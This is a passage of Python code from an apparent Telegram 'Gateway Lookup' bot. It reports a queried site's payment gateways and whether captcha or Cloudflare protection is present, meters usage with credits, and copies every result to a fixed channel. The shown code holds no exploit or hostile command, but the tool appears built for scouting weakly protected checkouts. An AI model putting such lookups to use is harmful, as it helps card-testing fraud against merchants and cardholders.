                        user = event.sender
                        checked = f"[{user.first_name}](tg://user?id={user.id})" if user.username else user.first_name
                        ch_name = 'coband'
                        ch_id = 'coband'
                        ch = f"[{ch_name}](https://t.me/{ch_id})"
                        end_time = time.time()
                        time_taken = end_time - start_time
                        rounded_time_taken = round(time_taken, 2)
                        msg=await edit.edit(f""" ┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ {', '.join(payment_gateways)}\n• 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ Captcha : {'✅' if captcha else '⛔'}\n                        Cloudflare : {'✅' if cloudflare else '⛔'}\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 : `{rounded_time_taken}``s`\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 {checked} [𝐕𝗜𝗣 👑]\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・{ch}・━━━━ ❞""")
                        await client.send_message(-1002146645497,msg)
                
                
                else:
                        user_id = event.sender_id
                        nu=None
                        
                        
                        if credit ==0:
                            await event.respond('🤖 **Credits Finished! Try /refresh** or \nBuy 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 (/help) for Unlimited usage 👑.', reply_to=event)
                        else:
                            user = event.sender
                            checked = f"[{user.first_name}](tg://user?id={user.id})" if user.username else user.first_name
                            ch_name = 'coband'
                            ch_id = 'coband'
                            ch = f"[{ch_name}](https://t.me/{ch_id})"
                            end_time = time.time()
                            time_taken = end_time - start_time
                            rounded_time_taken = round(time_taken, 2)
                            user_id = event.sender.id
                            current_time = datetime.now()
                            time_window = timedelta(seconds=25)
                            if (message_counts[user_id] > 1) and (current_time - last_message_time[user_id] < time_window):
                                
                                print()
                                
                                time_window = timedelta(seconds=25)
                                message_counts[user_id] = 0
                            else:
                                user_id = event.sender.id
                                minus(user_id)
                                msg = await edit.edit(f""" ┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ {', '.join(payment_gateways)}\n• 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ Captcha : {'✅' if captcha else '⛔'}\n                        Cloudflare : {'✅' if cloudflare else '⛔'}\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 : `{rounded_time_taken}``s`\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 {checked} [𝗙𝗿𝗲𝗲]\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・{ch}・━━━━ ❞""")
                                await client.send_message(-1002146645497,msg)
                                
                        
        del site_checking[user_id]            
        return
        print('Sending some words > ' + event.text)
       
    except Exception as e:
        print(e)
client.start()
client.run_until_disconnected()
